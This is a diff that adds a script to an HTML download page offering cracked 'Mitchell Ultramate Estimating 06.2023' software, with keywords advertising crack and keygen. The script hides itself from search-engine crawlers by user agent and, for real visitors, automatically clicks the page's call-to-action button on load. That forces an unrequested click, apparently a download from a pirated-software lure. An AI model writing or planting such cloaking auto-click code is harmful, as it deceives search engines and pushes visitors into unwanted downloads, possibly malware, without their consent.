@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mitchell Ultramate Estimating 06.2023</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Mitchell Ultramate Estimating 06.2023 software for creating accurate car repair cost estimates, used by auto repair shops and insurance companies.">
     <meta name="keywords" content="Mitchell Ultramate Estimating 06.2023, Mitchell Ultramate Estimating free download, Mitchell Ultramate Estimating 2023 download, Mitchell Ultramate Estimating 2023 free download, Mitchell Ultramate Estimating software, Mitchell Ultramate Estimating software download, Mitchell Ultramate Estimating software free download, Mitchell Ultramate Estimating software crack, Mitchell Ultramate Estimating software keygen, Mitchell Ultramate Estimating spare parts catalog, Mitchell Ultramate Estimating spare parts catalog download, Mitchell Ultramate Estimating catalog free download, Mitchell Ultramate Estimating 10.9 GB download, Mitchell автооценка ПО 2023, скачать Mitchell Ultramate 2023 бесплатно, региональное ПО Mitchell Ultramate, скачать ПО Mitchell Ultramate 2023, Mitchell Ultramate оцінка програмного забезпечення 2023, скачати Mitchell Ultramate 2023 безкоштовно, регіональне ПО Mitchell Ultramate, скачати ПО Mitchell Ultramate 2023">
     <style>
